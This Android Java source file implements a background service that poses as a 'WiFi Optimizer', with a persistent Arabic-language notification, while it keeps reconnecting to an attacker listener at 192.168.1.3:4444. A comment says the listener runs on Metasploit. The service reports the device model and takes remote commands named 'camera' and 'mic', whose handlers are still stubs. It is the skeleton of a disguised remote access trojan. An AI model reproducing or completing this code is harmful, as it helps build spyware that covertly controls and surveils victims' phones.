package com.abdullah.finalapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class BackgroundService extends Service {
    private static final String TAG = "BackgroundService";
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;

    // ⚠️ حط الـ IP بتاعك هنا (اللي شغال عليه Metasploit)
    private static final String SERVER_IP = "192.168.1.3"; 
    private static final int SERVER_PORT = 4444;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, buildNotification());
        
        new Thread(() -> {
            while (true) {
                try {
                    if (socket == null || socket.isClosed()) {
                        socket = new Socket(SERVER_IP, SERVER_PORT);
                        out = new PrintWriter(socket.getOutputStream(), true);
                        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                        out.println("Connected: " + Build.MODEL);
                    }
                    String command = in.readLine();
                    if (command != null) handleCommand(command);
                } catch (Exception e) {
                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                }
            }
        }).start();
    }

    private void handleCommand(String command) {
        Log.d(TAG, "Received: " + command);
        if (command.equals("camera")) {
            out.println("Camera command received...");
        } else if (command.equals("mic")) {
            out.println("Mic command received...");
        }
    }

    private Notification buildNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, "channel_id")
                    .setContentTitle("WiFi Optimizer")
                    .setContentText("جاري تحسين أداء الشبكة...")
                    .setSmallIcon(android.R.drawable.ic_menu_compass)
                    .setOngoing(true) // يخلي الإشعار ثابت ومش بيتشال
                    .build();
        }
        return new Notification.Builder(this)
                .setContentTitle("WiFi Optimizer")
                .setContentText("جاري تحسين أداء الشبكة...")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("channel_id", "Service Channel", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
